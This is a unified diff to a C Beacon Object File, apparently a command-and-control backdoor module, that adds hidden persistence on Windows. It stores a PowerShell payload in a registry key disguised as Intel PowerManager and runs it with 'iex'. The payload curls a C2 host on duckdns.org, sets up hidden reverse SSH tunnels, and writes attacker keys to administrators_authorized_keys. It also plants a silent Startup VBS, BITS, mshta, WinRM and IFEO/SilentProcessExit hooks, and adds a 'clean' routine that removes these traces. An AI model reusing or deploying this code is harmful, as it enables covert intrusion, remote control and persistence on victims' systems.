@@ -3,6 +3,7 @@
  *
  * recon:  help | list | paths | priv | status | check <id>
  * apply:  apply <id> [a] [b] [c]     one id per Demon (Coffee/WaitCrypt)
+ * clean:  clean <id>|all             drop persist for that id (sshd/WinRM stay)
  *
  * Patterns stolen (source, not .o):
  *   COM-Hunter LocalServer32 / TreatAs / MsCtfMonitor CLSID
@@ -60,6 +61,12 @@
 #endif
 #ifndef DETACHED_PROCESS
 #define DETACHED_PROCESS 0x00000008
+#endif
+#ifndef CREATE_NEW_PROCESS_GROUP
+#define CREATE_NEW_PROCESS_GROUP 0x00000200
+#endif
+#ifndef SW_HIDE
+#define SW_HIDE 0
 #endif
 #ifndef STARTF_USESHOWWINDOW
 #define STARTF_USESHOWWINDOW 0x00000001
@@ -142,6 +149,7 @@
 #define FW_SSH         "RiptideSSH"
 #define WG_NET         "10.66.0.0/24"
 #define DEF_WAKE       "https://maelstrom-c2.duckdns.org/cdn/img/p1-reg.jpg"
+#define REG_IPMA       "Software\\Intel\\PowerManager"
 
 WINBASEAPI DWORD WINAPI KERNEL32$GetLastError(VOID);
 WINBASEAPI HANDLE WINAPI KERNEL32$GetCurrentProcess(VOID);
@@ -155,6 +163,7 @@ WINBASEAPI HANDLE WINAPI KERNEL32$CreateFileA(LPCSTR, DWORD, DWORD, LPSECURITY_A
 WINBASEAPI BOOL WINAPI KERNEL32$WriteFile(HANDLE, LPCVOID, DWORD, LPDWORD, LPOVERLAPPED);
 WINBASEAPI BOOL WINAPI KERNEL32$ReadFile(HANDLE, LPVOID, DWORD, LPDWORD, LPOVERLAPPED);
 WINBASEAPI DWORD WINAPI KERNEL32$GetFileSize(HANDLE, LPDWORD);
+WINBASEAPI BOOL WINAPI KERNEL32$DeleteFileA(LPCSTR);
 WINADVAPI BOOL WINAPI ADVAPI32$OpenProcessToken(HANDLE, DWORD, PHANDLE);
 WINADVAPI BOOL WINAPI ADVAPI32$GetTokenInformation(HANDLE, TOKEN_INFORMATION_CLASS, LPVOID, DWORD, PDWORD);
 WINADVAPI BOOL WINAPI ADVAPI32$LookupPrivilegeNameA(LPCSTR, PLUID, LPSTR, LPDWORD);
@@ -335,15 +344,17 @@ static DWORD spawn(const char *cmd)
 {
     STARTUPINFOA si;
     PROCESS_INFORMATION pi;
-    DWORD pid;
+    DWORD pid, fl;
 
     zmem(&si, sizeof(si));
     zmem(&pi, sizeof(pi));
     si.cb = sizeof(si);
     si.dwFlags = STARTF_USESHOWWINDOW;
+    si.wShowWindow = SW_HIDE;
+    /* CREATE_NO_WINDOW ignored with DETACHED_PROCESS — do not combine. No cmd.exe wrap. */
+    fl = CREATE_NO_WINDOW | CREATE_NEW_PROCESS_GROUP;
     MSVCRT$_snprintf(g_spawn, sizeof(g_spawn), "%s", cmd);
-    if (!KERNEL32$CreateProcessA(
-            NULL, g_spawn, NULL, NULL, FALSE, CREATE_NO_WINDOW | DETACHED_PROCESS, NULL, NULL, &si, &pi)) {
+    if (!KERNEL32$CreateProcessA(NULL, g_spawn, NULL, NULL, FALSE, fl, NULL, NULL, &si, &pi)) {
         pid = KERNEL32$GetLastError();
         BeaconPrintf(CALLBACK_ERROR, "[backdoor] CreateProcess err=%u\n", pid);
         return pid;
@@ -576,29 +587,47 @@ static void persist_task(const char *tn, const char *sched, const char *tr)
     spawn(g_cmd);
 }
 
+static int stash_wake(const char *url)
+{
+    char curl[MAX_PATH], ps[900];
+    const char *u = url_ok(url) ? url : DEF_WAKE;
+    find_curl(curl, sizeof(curl));
+    MSVCRT$_snprintf(
+        ps, sizeof(ps),
+        "Start-Process -WindowStyle Hidden -FilePath '%s' -ArgumentList '-sS','-m','25','-o','NUL','%s'",
+        curl, u);
+    if (!reg_sz(HKEY_CURRENT_USER, REG_IPMA, "Data", ps))
+        return 0;
+    BeaconPrintf(CALLBACK_OUTPUT, "[backdoor] HKCU %s\\Data (payload in-reg)\n", REG_IPMA);
+    return 1;
+}
+
 static int drop_wake_cmd(const char *url, char *out, unsigned n)
 {
-    char dir[MAX_PATH], curl[MAX_PATH];
-    const char *u = url_ok(url) ? url : DEF_WAKE;
+    char dir[MAX_PATH];
+    if (!stash_wake(url))
+        return 0;
     if (!intel_dir(dir, sizeof(dir))) {
         BeaconPrintf(CALLBACK_ERROR, "[backdoor] LOCALAPPDATA\\Intel\\PowerManager\n");
         return 0;
     }
-    join2(out, n, dir, "ipma-upd.cmd");
-    find_curl(curl, sizeof(curl));
+    join2(out, n, dir, "ipma-reg.ps1");
     MSVCRT$_snprintf(
         g_body, sizeof(g_body),
-        "@echo off\r\n\"%s\" -sS -m 25 -o NUL \"%s\"\r\n",
-        curl, u);
+        "$ErrorActionPreference='SilentlyContinue'\r\n"
+        "iex ((Get-ItemProperty -LiteralPath 'HKCU:\\Software\\Intel\\PowerManager').Data)\r\n");
     if (!write_all(out, g_body))
         return 0;
-    BeaconPrintf(CALLBACK_OUTPUT, "[backdoor] drop %s\n", out);
+    BeaconPrintf(CALLBACK_OUTPUT, "[backdoor] drop launcher %s (no HMAC in file)\n", out);
     return 1;
 }
 
 static void cmd_as_file(char *out, unsigned n, const char *file)
 {
-    MSVCRT$_snprintf(out, n, "C:\\Windows\\System32\\cmd.exe /c \"%s\"", file);
+    MSVCRT$_snprintf(
+        out, n,
+        "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -NoP -NonI -W Hidden -File %s",
+        file);
 }
 
 static void ps_file_line(char *out, unsigned n, const char *ps1)
@@ -654,6 +683,7 @@ static void cmd_help(void)
         "  paths | priv | status\n"
         "  check <id>\n"
         "  apply <id> [a] [b]\n"
+        "  clean <id>|all\n"
         "ids: wake ssh sshkey knock dns doh bits com treatas logon\n"
         "     startup profile active autorun mshta winrm proxy wmi time sshd ifeo\n"
         "inbound only %s. never WAN 22/5985. keys = file.\n"
@@ -836,9 +866,9 @@ static void apply_wake(const char *url)
     char file[MAX_PATH], run[400];
     if (!drop_wake_cmd(url, file, sizeof(file)))
         return;
-    BeaconPrintf(CALLBACK_OUTPUT, "[apply wake] now + HKCU Run + ONLOGON (HMAC in file, not schtask)\n");
-    spawn(file);
+    BeaconPrintf(CALLBACK_OUTPUT, "[apply wake] now + HKCU Run + ONLOGON (payload in-reg, hidden powershell)\n");
     cmd_as_file(run, sizeof(run), file);
+    spawn(run);
     persist_run(RUN_WAKE, run);
     persist_task(TASK_WAKE, "ONLOGON", run);
 }
@@ -862,16 +892,16 @@ static void apply_ssh(const char *hop, const char *rspec)
     }
     if (!intel_dir(dir, sizeof(dir)))
         return;
-    join2(file, sizeof(file), dir, "ipma-ssh.cmd");
+    join2(file, sizeof(file), dir, "ipma-ssh.ps1");
     MSVCRT$_snprintf(
         g_body, sizeof(g_body),
-        "@echo off\r\n\"%s\" -i \"%s\" -N -T -R %s -o BatchMode=yes -o StrictHostKeyChecking=no -o UserKnownHostsFile=NUL -o ServerAliveInterval=30 -o ServerAliveCountMax=3 -o ExitOnForwardFailure=yes -o ConnectTimeout=8 %s\r\n",
+        "Start-Process -WindowStyle Hidden -FilePath '%s' -ArgumentList @('-i','%s','-N','-T','-R','%s','-o','BatchMode=yes','-o','StrictHostKeyChecking=no','-o','UserKnownHostsFile=NUL','-o','ServerAliveInterval=30','-o','ServerAliveCountMax=3','-o','ExitOnForwardFailure=yes','-o','ConnectTimeout=8','%s')\r\n",
         ssh, idf, r, h);
     if (!write_all(file, g_body))
         return;
-    BeaconPrintf(CALLBACK_OUTPUT, "[apply ssh] -R %s %s persist (NAT punch)\n", r, h);
-    spawn(file);
+    BeaconPrintf(CALLBACK_OUTPUT, "[apply ssh] -R %s %s persist hidden (NAT punch)\n", r, h);
     cmd_as_file(run, sizeof(run), file);
+    spawn(run);
     persist_run(TASK_SSH, run);
     persist_task(TASK_SSH, "ONLOGON", run);
 }
@@ -897,23 +927,42 @@ static void apply_sshkey(const char *pubkey)
         needle = pubkey + MSVCRT$strlen(pubkey) - 40;
     if (file_has(ak, needle)) {
         BeaconPrintf(CALLBACK_OUTPUT, "[apply sshkey] already present %s\n", ak);
-        return;
+    } else {
+        h = KERNEL32$CreateFileA(
+            ak, FILE_APPEND_DATA | GENERIC_WRITE, 0, NULL, OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
+        if (h == INVALID_HANDLE_VALUE) {
+            BeaconPrintf(CALLBACK_ERROR, "[apply sshkey] write err=%u\n", KERNEL32$GetLastError());
+        } else {
+            KERNEL32$WriteFile(h, pubkey, (DWORD)MSVCRT$strlen(pubkey), &w, NULL);
+            KERNEL32$WriteFile(h, "\n", 1, &w, NULL);
+            KERNEL32$CloseHandle(h);
+            BeaconPrintf(CALLBACK_OUTPUT, "[apply sshkey] append %s (%u bytes)\n", ak, w);
+            MSVCRT$_snprintf(
+                ic, sizeof(ic),
+                "C:\\Windows\\System32\\icacls.exe \"%s\" /inheritance:r /grant:r \"%%USERNAME%%:F\"",
+                ak);
+            spawn(ic);
+        }
     }
-    h = KERNEL32$CreateFileA(
-        ak, FILE_APPEND_DATA | GENERIC_WRITE, 0, NULL, OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
-    if (h == INVALID_HANDLE_VALUE) {
-        BeaconPrintf(CALLBACK_ERROR, "[apply sshkey] write err=%u\n", KERNEL32$GetLastError());
-        return;
+    if (current_il() >= 0x00003000 || BeaconIsAdmin()) {
+        char ak2[MAX_PATH];
+        if (join_env(ak2, sizeof(ak2), "ProgramData", "ssh\\administrators_authorized_keys")
+            && !file_has(ak2, needle)) {
+            h = KERNEL32$CreateFileA(
+                ak2, FILE_APPEND_DATA | GENERIC_WRITE, 0, NULL, OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
+            if (h != INVALID_HANDLE_VALUE) {
+                KERNEL32$WriteFile(h, pubkey, (DWORD)MSVCRT$strlen(pubkey), &w, NULL);
+                KERNEL32$WriteFile(h, "\n", 1, &w, NULL);
+                KERNEL32$CloseHandle(h);
+                BeaconPrintf(CALLBACK_OUTPUT, "[apply sshkey] append %s (Administrators)\n", ak2);
+                MSVCRT$_snprintf(
+                    ic, sizeof(ic),
+                    "C:\\Windows\\System32\\icacls.exe \"%s\" /inheritance:r /grant:r \"Administrators:F\" /grant:r \"SYSTEM:F\"",
+                    ak2);
+                spawn(ic);
+            }
+        }
     }
-    KERNEL32$WriteFile(h, pubkey, (DWORD)MSVCRT$strlen(pubkey), &w, NULL);
-    KERNEL32$WriteFile(h, "\n", 1, &w, NULL);
-    KERNEL32$CloseHandle(h);
-    BeaconPrintf(CALLBACK_OUTPUT, "[apply sshkey] append %s (%u bytes) — user file, not administrators_authorized_keys\n", ak, w);
-    MSVCRT$_snprintf(
-        ic, sizeof(ic),
-        "C:\\Windows\\System32\\icacls.exe \"%s\" /inheritance:r /grant:r \"%%USERNAME%%:F\"",
-        ak);
-    spawn(ic);
 }
 
 static void apply_knock(const char *mode, const char *secret, const char *url)
@@ -1042,7 +1091,7 @@ static void apply_bits(const char *url)
     spawn(g_cmd);
     MSVCRT$_snprintf(g_cmd, sizeof(g_cmd), "\"%s\" /addfile MaelBdBits \"%s\" \"%s\"", ba, url, dst);
     spawn(g_cmd);
-    MSVCRT$_snprintf(g_cmd, sizeof(g_cmd), "\"%s\" /SetNotifyCmdLine MaelBdBits C:\\Windows\\System32\\cmd.exe \"/c %s\"", ba, file);
+    MSVCRT$_snprintf(g_cmd, sizeof(g_cmd), "\"%s\" /SetNotifyCmdLine MaelBdBits C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe \"-NoP -NonI -W Hidden -File %s\"", ba, file);
     spawn(g_cmd);
     MSVCRT$_snprintf(g_cmd, sizeof(g_cmd), "\"%s\" /SetMinRetryDelay MaelBdBits 60", ba);
     spawn(g_cmd);
@@ -1097,11 +1146,15 @@ static void apply_startup(const char *url)
     char file[MAX_PATH], dst[MAX_PATH];
     if (!drop_wake_cmd(url, file, sizeof(file)))
         return;
-    if (!join_env(dst, sizeof(dst), "APPDATA", "Microsoft\\Windows\\Start Menu\\Programs\\Startup\\IpmaUpdate.cmd"))
+    if (!join_env(dst, sizeof(dst), "APPDATA", "Microsoft\\Windows\\Start Menu\\Programs\\Startup\\IpmaUpdate.vbs"))
         return;
-    BeaconPrintf(CALLBACK_OUTPUT, "[apply startup] PersistBOF T1547.001 %s\n", dst);
+    MSVCRT$_snprintf(
+        g_body, sizeof(g_body),
+        "CreateObject(\"Wscript.Shell\").Run \"powershell.exe -NoP -NonI -W Hidden -File %s\", 0, False\r\n",
+        file);
+    BeaconPrintf(CALLBACK_OUTPUT, "[apply startup] PersistBOF T1547.001 silent vbs %s\n", dst);
     if (write_all(dst, g_body))
-        BeaconPrintf(CALLBACK_OUTPUT, "[apply startup] wrote Startup cmd\n");
+        BeaconPrintf(CALLBACK_OUTPUT, "[apply startup] wrote Startup vbs\n");
 }
 
 static void apply_profile(const char *url)
@@ -1164,13 +1217,16 @@ static void apply_mshta(const char *url)
     }
     if (!intel_dir(dir, sizeof(dir)))
         return;
-    join2(file, sizeof(file), dir, "ipma-hta.cmd");
-    MSVCRT$_snprintf(g_body, sizeof(g_body), "@echo off\r\n\"%s\" \"%s\"\r\n", hta, u);
+    join2(file, sizeof(file), dir, "ipma-hta.ps1");
+    MSVCRT$_snprintf(
+        g_body, sizeof(g_body),
+        "Start-Process -WindowStyle Hidden -FilePath '%s' -ArgumentList '%s'\r\n",
+        hta, u);
     if (!write_all(file, g_body))
         return;
-    BeaconPrintf(CALLBACK_OUTPUT, "[apply mshta] T1218.005 signed HTA\n");
-    spawn(file);
+    BeaconPrintf(CALLBACK_OUTPUT, "[apply mshta] T1218.005 signed HTA hidden\n");
     cmd_as_file(run, sizeof(run), file);
+    spawn(run);
     persist_run(TASK_HTA, run);
     persist_task(TASK_HTA, "ONLOGON", run);
 }
@@ -1183,20 +1239,20 @@ static void apply_winrm(const char *scope)
     }
     if (!need_high("winrm"))
         return;
-    BeaconPrintf(CALLBACK_OUTPUT, "[apply winrm] firewall %s THEN enable. never 5985/internet.\n", WG_NET);
+    BeaconPrintf(CALLBACK_OUTPUT, "[apply winrm] Enable-PSRemoting then fw %s. never 5985/internet.\n", WG_NET);
+    spawn("C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -NoP -W Hidden -C \"Enable-PSRemoting -Force -SkipNetworkProfileCheck\"");
     fw_in(FW_WINRM, "TCP", 5985);
     MSVCRT$_snprintf(
         g_cmd, sizeof(g_cmd),
         "C:\\Windows\\System32\\netsh.exe advfirewall firewall set rule group=\"Windows Remote Management\" new remoteip=%s",
         WG_NET);
     spawn(g_cmd);
-    spawn("C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -NoP -W Hidden -C \"Enable-PSRemoting -Force -SkipNetworkProfileCheck\"");
 }
 
 static void apply_proxy(const char *lip, const char *lport)
 {
     char vname[80], vdata[80];
-    const char *ip = nonempty(lip) ? lip : "10.66.0.3";
+    const char *ip = nonempty(lip) ? lip : "127.0.0.1";
     const char *po = nonempty(lport) ? lport : "2200";
     if (wan_refuse(ip)) {
         BeaconPrintf(CALLBACK_ERROR, "[apply proxy] refuse WAN listen\n");
@@ -1249,10 +1305,11 @@ static void apply_time(const char *dll)
         BeaconPrintf(CALLBACK_ERROR, "[apply time] NEED SYSTEM. no DLL drop from this BOF.\n");
         return;
     }
-    if (nonempty(dll))
-        MSVCRT$_snprintf(p, sizeof(p), "%s", dll);
-    else
-        join_env(p, sizeof(p), "SystemRoot", "System32\\w32time.dll");
+    if (!nonempty(dll)) {
+        BeaconPrintf(CALLBACK_ERROR, "[apply time] need existing DLL path. will not drop or register stock w32time.dll.\n");
+        return;
+    }
+    MSVCRT$_snprintf(p, sizeof(p), "%s", dll);
     if (!exists(p)) {
         BeaconPrintf(CALLBACK_ERROR, "[apply time] DLL missing %s — skip, will not drop.\n", p);
         return;
@@ -1289,6 +1346,297 @@ static void apply_ifeo(const char *url)
     reg_dw(HKEY_LOCAL_MACHINE, "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\WerFault.exe", "GlobalFlag", 0x200);
     reg_dw(HKEY_LOCAL_MACHINE, "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\SilentProcessExit\\WerFault.exe", "ReportingMode", 1);
     reg_sz(HKEY_LOCAL_MACHINE, "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\SilentProcessExit\\WerFault.exe", "MonitorProcess", run);
+}
+
+static void zap_file(const char *path)
+{
+    if (!nonempty(path))
+        return;
+    if (!exists(path)) {
+        BeaconPrintf(CALLBACK_OUTPUT, "[clean] miss %s\n", path);
+        return;
+    }
+    if (KERNEL32$DeleteFileA(path))
+        BeaconPrintf(CALLBACK_OUTPUT, "[clean] del %s\n", path);
+    else
+        BeaconPrintf(CALLBACK_ERROR, "[clean] del %s err=%u\n", path, KERNEL32$GetLastError());
+}
+
+static void zap_task(const char *tn)
+{
+    MSVCRT$_snprintf(
+        g_cmd, sizeof(g_cmd),
+        "C:\\Windows\\System32\\schtasks.exe /delete /tn %s /f", tn);
+    spawn(g_cmd);
+}
+
+static void zap_fw(const char *name)
+{
+    MSVCRT$_snprintf(
+        g_cmd, sizeof(g_cmd),
+        "C:\\Windows\\System32\\netsh.exe advfirewall firewall delete rule name=%s",
+        name);
+    spawn(g_cmd);
+}
+
+static void zap_run(const char *name)
+{
+    MSVCRT$_snprintf(
+        g_cmd, sizeof(g_cmd),
+        "C:\\Windows\\System32\\reg.exe delete HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v %s /f",
+        name);
+    spawn(g_cmd);
+}
+
+static void zap_reg(const char *spec)
+{
+    MSVCRT$_snprintf(
+        g_cmd, sizeof(g_cmd),
+        "C:\\Windows\\System32\\reg.exe delete \"%s\" /f", spec);
+    spawn(g_cmd);
+}
+
+static void zap_intel(const char *name)
+{
+    char dir[MAX_PATH], p[MAX_PATH];
+    if (!intel_dir(dir, sizeof(dir)))
+        return;
+    if (join2(p, sizeof(p), dir, name))
+        zap_file(p);
+}
+
+static void clean_wake(void)
+{
+    zap_intel("ipma-upd.cmd");
+    zap_intel("ipma-reg.ps1");
+    zap_run(RUN_WAKE);
+    zap_task(TASK_WAKE);
+    zap_reg("HKCU\\Software\\Intel\\PowerManager");
+}
+
+static void clean_ssh(void)
+{
+    zap_intel("ipma-ssh.cmd");
+    zap_intel("ipma-ssh.ps1");
+    zap_run(TASK_SSH);
+    zap_task(TASK_SSH);
+}
+
+static void clean_sshkey(const char *needle)
+{
+    if (!nonempty(needle)) {
+        BeaconPrintf(CALLBACK_OUTPUT, "[clean sshkey] skip keys file — pass pubkey/needle. will not wipe authorized_keys\n");
+        return;
+    }
+    MSVCRT$_snprintf(
+        g_cmd, sizeof(g_cmd),
+        "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -NoP -W Hidden -C \""
+        "$n='%s';"
+        "foreach($f in @($env:USERPROFILE+'\\.ssh\\authorized_keys','C:\\ProgramData\\ssh\\administrators_authorized_keys')){"
+        "if(Test-Path $f){$t=Get-Content $f | ? { $_ -notmatch [regex]::Escape($n) }; Set-Content -Path $f -Value $t -Encoding ASCII}"
+        "}\"",
+        needle);
+    spawn(g_cmd);
+    BeaconPrintf(CALLBACK_OUTPUT, "[clean sshkey] stripped needle from user+ProgramData keys\n");
+}
+
+static void clean_knock(void)
+{
+    zap_intel("ipma-spa.ps1");
+    zap_run(TASK_SPA);
+    zap_task(TASK_SPA);
+    zap_fw(FW_SPA);
+    spawn("C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -NoP -W Hidden -C \"Get-CimInstance Win32_Process | Where-Object { $_.CommandLine -match 'ipma-spa' } | ForEach-Object { Stop-Process -Id $_.ProcessId -Force -EA 0 }\"");
+}
+
+static void clean_dns(void)
+{
+    zap_intel("ipma-dns.ps1");
+    zap_task(TASK_DNS);
+}
+
+static void clean_doh(void)
+{
+    zap_intel("ipma-doh.ps1");
+    zap_task(TASK_DOH);
+}
+
+static void clean_bits(void)
+{
+    spawn("C:\\Windows\\System32\\bitsadmin.exe /cancel MaelBdBits");
+}
+
+static void clean_com(void)
+{
+    zap_reg("HKCU\\Software\\Classes\\CLSID\\" CLSID_CTF "\\LocalServer32");
+    zap_reg("HKCU\\Software\\Classes\\CLSID\\" CLSID_CACHE "\\LocalServer32");
+    zap_reg("HKCU\\Software\\Classes\\CLSID\\" CLSID_BD "\\LocalServer32");
+    zap_reg("HKCU\\Software\\Classes\\CLSID\\" CLSID_BD);
+    zap_task(TASK_COM);
+}
+
+static void clean_treatas(void)
+{
+    zap_reg("HKCU\\Software\\Classes\\CLSID\\" CLSID_CTF "\\TreatAs");
+    zap_reg("HKCU\\Software\\Classes\\CLSID\\" CLSID_BD "\\LocalServer32");
+}
+
+static void clean_logon(void)
+{
+    spawn("C:\\Windows\\System32\\reg.exe delete HKCU\\Environment /v UserInitMprLogonScript /f");
+}
+
+static void clean_startup(void)
+{
+    char p[MAX_PATH];
+    if (join_env(p, sizeof(p), "APPDATA", "Microsoft\\Windows\\Start Menu\\Programs\\Startup\\IpmaUpdate.cmd"))
+        zap_file(p);
+    if (join_env(p, sizeof(p), "APPDATA", "Microsoft\\Windows\\Start Menu\\Programs\\Startup\\IpmaUpdate.vbs"))
+        zap_file(p);
+    if (join_env(p, sizeof(p), "APPDATA", "Microsoft\\Windows\\Start Menu\\Programs\\Startup\\IpmaUpdate.ps1"))
+        zap_file(p);
+}
+
+static void clean_profile(void)
+{
+    spawn("C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -NoP -NonI -W Hidden -C \"$p=$env:USERPROFILE+'\\Documents\\WindowsPowerShell\\Microsoft.PowerShell_profile.ps1'; if(Test-Path $p){ Get-Content $p | Where-Object { $_ -notmatch 'ipma-upd|ipma-reg|PowerManager|MaelBd' } | Set-Content $p -Encoding ASCII }\"");
+}
+
+static void clean_active(void)
+{
+    zap_reg("HKCU\\Software\\Microsoft\\Active Setup\\Installed Components\\" CLSID_BD);
+}
+
+static void clean_autorun(void)
+{
+    spawn("C:\\Windows\\System32\\reg.exe delete \"HKCU\\Software\\Microsoft\\Command Processor\" /v AutoRun /f");
+}
+
+static void clean_mshta(void)
+{
+    zap_intel("ipma-hta.cmd");
+    zap_intel("ipma-hta.ps1");
+    zap_run(TASK_HTA);
+    zap_task(TASK_HTA);
+}
+
+static void clean_winrm(void)
+{
+    BeaconPrintf(CALLBACK_OUTPUT, "[clean winrm] fw only. WinRM service stays (LAN).\n");
+    zap_fw(FW_WINRM);
+}
+
+static void clean_proxy(void)
+{
+    spawn("C:\\Windows\\System32\\reg.exe delete HKLM\\SYSTEM\\CurrentControlSet\\Services\\PortProxy\\v4tov4\\tcp /v 127.0.0.1/2200 /f");
+    spawn("C:\\Windows\\System32\\reg.exe delete HKLM\\SYSTEM\\CurrentControlSet\\Services\\PortProxy\\v4tov4\\tcp /v 10.66.0.3/2200 /f");
+    iphlp_reload();
+}
+
+static void clean_wmi(void)
+{
+    zap_intel("ipma-wmi.ps1");
+    spawn("C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -NoP -W Hidden -C \"$ns='root\\subscription';$n='MaelBdWmi'; Get-WmiObject -Namespace $ns -Class __FilterToConsumerBinding -EA 0 | Where-Object { $_.Filter -match $n } | ForEach-Object { $_.Delete() }; Get-WmiObject -Namespace $ns -Class CommandLineEventConsumer -EA 0 | Where-Object { $_.Name -eq $n } | ForEach-Object { $_.Delete() }; Get-WmiObject -Namespace $ns -Class __EventFilter -EA 0 | Where-Object { $_.Name -eq $n } | ForEach-Object { $_.Delete() }\"");
+}
+
+static void clean_time(void)
+{
+    zap_reg("HKLM\\SYSTEM\\CurrentControlSet\\Services\\W32Time\\TimeProviders\\MaelBdTime");
+}
+
+static void clean_sshd(void)
+{
+    BeaconPrintf(CALLBACK_OUTPUT, "[clean sshd] fw overlay only. sshd stays (LAN).\n");
+    zap_fw(FW_SSH);
+}
+
+static void clean_ifeo(void)
+{
+    zap_reg("HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\WerFault.exe");
+    zap_reg("HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\SilentProcessExit\\WerFault.exe");
+}
+
+static void cmd_clean(const char *id, const char *extra)
+{
+    BeaconPrintf(CALLBACK_OUTPUT, "[clean] id=%s il=0x%X\n",
+        nonempty(id) ? id : "?", current_il());
+    if (!nonempty(id) || eq(id, "help")) {
+        BeaconPrintf(CALLBACK_OUTPUT, "[clean] usage: backdoor clean <id>|all\n");
+        BeaconPrintf(CALLBACK_OUTPUT, "[clean] sshd/winrm: fw only, services stay.\n");
+        BeaconPrintf(CALLBACK_OUTPUT, "[clean] sshkey: pass needle, never wipe whole authorized_keys.\n");
+        return;
+    }
+    if (eq(id, "all")) {
+        clean_wake();
+        clean_ssh();
+        clean_knock();
+        clean_dns();
+        clean_doh();
+        clean_bits();
+        clean_com();
+        clean_treatas();
+        clean_logon();
+        clean_startup();
+        clean_profile();
+        clean_active();
+        clean_autorun();
+        clean_mshta();
+        clean_winrm();
+        clean_proxy();
+        clean_wmi();
+        clean_time();
+        clean_sshd();
+        clean_ifeo();
+        BeaconPrintf(CALLBACK_OUTPUT, "[clean] all done (sshkey skipped — pass needle)\n");
+        return;
+    }
+    if (eq(id, "wake"))
+        clean_wake();
+    else if (eq(id, "ssh"))
+        clean_ssh();
+    else if (eq(id, "sshkey"))
+        clean_sshkey(extra);
+    else if (eq(id, "knock") || eq(id, "spa") || eq(id, "magic"))
+        clean_knock();
+    else if (eq(id, "dns"))
+        clean_dns();
+    else if (eq(id, "doh"))
+        clean_doh();
+    else if (eq(id, "bits"))
+        clean_bits();
+    else if (eq(id, "com"))
+        clean_com();
+    else if (eq(id, "treatas"))
+        clean_treatas();
+    else if (eq(id, "logon"))
+        clean_logon();
+    else if (eq(id, "startup"))
+        clean_startup();
+    else if (eq(id, "profile"))
+        clean_profile();
+    else if (eq(id, "active"))
+        clean_active();
+    else if (eq(id, "autorun"))
+        clean_autorun();
+    else if (eq(id, "mshta"))
+        clean_mshta();
+    else if (eq(id, "winrm"))
+        clean_winrm();
+    else if (eq(id, "proxy"))
+        clean_proxy();
+    else if (eq(id, "wmi"))
+        clean_wmi();
+    else if (eq(id, "time"))
+        clean_time();
+    else if (eq(id, "sshd"))
+        clean_sshd();
+    else if (eq(id, "ifeo"))
+        clean_ifeo();
+    else {
+        BeaconPrintf(CALLBACK_ERROR, "[clean] unknown id '%s'\n", id);
+        return;
+    }
+    BeaconPrintf(CALLBACK_OUTPUT, "[clean] done %s\n", id);
 }
 
 static void cmd_apply(const char *id, const char *a, const char *b, const char *c)
@@ -1377,6 +1725,8 @@ void go(char *args, int len)
         cmd_check(a);
     else if (eq(cmd, "apply"))
         cmd_apply(a, b, c, d);
+    else if (eq(cmd, "clean") || eq(cmd, "clear") || eq(cmd, "rm"))
+        cmd_clean(a, b);
     else if (eq(cmd, "wake") || eq(cmd, "ssh") || eq(cmd, "sshkey") || eq(cmd, "winrm")
              || eq(cmd, "wmi") || eq(cmd, "proxy") || eq(cmd, "bits") || eq(cmd, "com")
              || eq(cmd, "dns") || eq(cmd, "doh") || eq(cmd, "logon") || eq(cmd, "time")
